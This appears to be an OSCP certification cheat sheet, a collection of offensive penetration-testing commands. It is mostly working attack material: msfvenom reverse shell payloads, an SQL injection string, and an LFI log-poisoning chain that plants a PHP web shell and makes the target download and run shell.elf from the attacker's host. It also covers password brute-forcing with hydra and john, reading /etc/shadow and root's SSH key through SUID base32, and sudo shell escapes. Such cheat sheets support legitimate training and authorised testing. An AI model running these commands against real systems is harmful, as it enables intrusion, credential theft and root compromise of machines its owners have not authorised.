# OSCP-Cheat-Sheets
Preparation OSCP
https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html
https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html

# Recon
```bash
nmap -Pn -sT -sV -n <IP> -p- --min-rate 1000 --max-retries 2 --reason
nmap -Pn -sT -sV -sC -n <IP> -p <PORTS> 
nmap -Pn -sT -A -n <IP> -p <PORTS>
nmap -Pn -sT -sV --script http-enum -n <IP> -p <PORT> 
nmap -Pn -sT -n --script smb-enum-shares.nse <IP> -p 135,139,445
```
```bash
smbclient -L <IP> -N
smbclient //IP/<RESOURCE> -N
smbclient //IP/IPC$ -N
```
```bash
smbmap -H <IP> -u ''
```
```bash
ping <IP> -R
ping <IP> -c 3 # View TTL
```
```bash
curl -s -i -k https://<IP>
curl -L <URL>
curl -i <URL>
```
```bash
nikto -h <URL> -C all
```

## Fuzzer directory
```bash
dirb <URL>
```
```bash
python3 /opt/dirsearch/dirsearch.py -u <URL> -e php,txt -x 403
python3 /opt/dirsearch/dirsearch.py -u <URL> -w /usr/share/dirb/wordlists/common.txt -e php,txt,cgi
python3 /opt/dirsearch/dirsearch.py -u <URL> -w /usr/share/dirb/wordlists/big.txt -e php,txt
python3 /opt/dirsearch/dirsearch.py -u <URL> -e php,txt -x 403 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
python3 /opt/dirsearch/dirsearch.py -u <URL> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e php,txt,cgi
```
```bash
gobuster -u <URL> -t 50 -w /usr/share/dirb/wordlists/big.txt -x .php,.html,.txt -r 
```
```bash
wfuzz -c -t 500 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://<IP>/FUZZ
wfuzz -c -t 500 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w ext.txt http://<IP>/FUZZ.FUZ2Z
```

# Explotation
```bash
searchsploit <>
```

## SHELLS
https://netsec.ws/?p=337
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

## Brute force
```bash
john hash_passwd.txt --wordlist=/usr/share/wordlists/rockyou.txt

unshadow passwd shadow > crack
john --wordlist=/usr/share/wordlists/rockyou.txt crack 
```
```bash
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt --force # $1$ MD5
```
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> ssh
```
```bash
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' cathrine.zip 
unzip cathrine.zip
```
```bash
cewl http://192.168.148.80 -m 5 -w words.txt
```

## SSH
```bash
ssh -i id_rsa tom@192.168.74.107
/usr/bin/base32 /root/.ssh/id_rsa | base32 --decode
```

## SQL injection
```bash
' or 1=1 --
```

## LFI
https://www.hackingarticles.in/apache-log-poisoning-through-lfi/
https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html
```bash
 curl http://192.168.148.80/console/file.php?file=/etc/passwd
```
```shell
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log

**Logs Apache**
/var/log/apache2/error.log
/var/log/apache2/access.log
other_vhosts_access.log

/var/log/auth.log

wfuzz -c -t 500 --hc=404 --hl=0 -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt http://192.168.148.80/console/file.php?file=FUZZ 

**Log poisoning**
ssh \<?php\ passthru\(\$_GET[\'cmd\']\)\;\ ?\>@192.168.230.80
http://<IP>/console/file.php?file=/var/log/auth.log&cmd=wget%20http://<MyIP>/shell.elf
http://<IP>/console/file.php?file=/var/log/auth.log&cmd=chmod%20%2bx%20shell.elf
http://<IP>/console/file.php?file=/var/log/auth.log&cmd=./shell.elf
```

## Interactive shell
```bash
script /dev/null -c bash
ctrl + ^Z
stty raw -echo
fg
reset
xterm
export TERM=xterm-256color
export TERM=xterm
export SHELL=bash
stty rows 26 columns 211
```
stty -a # get rows and colummns

## Escape restricted shell
```bash
user@host:~$ vim
:set shell=/bin/sh
:shell

$ /bin/bash
```

## Recon
```bash
cat /etc/passwd | cut -d ':' -f 1,7 | grep "bash\|sh" | grep -v "sshd"
cat /etc/passwd | grep bash
ls -la /etc/passwd
ls -la /etc/shadow
```
 
# Privilege escalation
https://gtfobins.github.io
https://book.hacktricks.xyz/linux-unix/privilege-escalation
https://github.com/carlospolop/hacktricks/tree/master/linux-unix/privilege-escalation
https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

```bash
sudo -l
```

## SUID
```bash
$ find / -perm -u=s -type f 2>/dev/null
$ zsh
$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
$ /usr/bin/base32 /etc/shadow | base32 --decode
$ /usr/bin/base32 /etc/passwd | base32 --decode
$ /usr/bin/base32 /root/.ssh/id_rsa | base32 --decode
```

## SUDO
```bash
sudo mysql -e '\! /bin/sh'
sudo /usr/bin/mysql -e 'system bash'
sudo /usr/bin/pkexec /bin/sh
sudo /usr/bin/pkexec chmod u+s /bin/bash
sudo /usr/bin/time /bin/sh
sudo /bin/bash  # (ALL : ALL) ALL

/bin/systemctl start|stop|restart apache2
cat /etc/apache2/apache2.conf | grep <user>

TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF

```

## Linux capabilities
```bash
getcap -r / 2>/dev/null
```

## Scheduled tasks
```bash
cat /etc/crontab 
```

## Cipher
https://www.dcode.fr/cipher-identifier
https://gchq.github.io/CyberChef/
https://www.tunnelsup.com/hash-analyzer/
https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
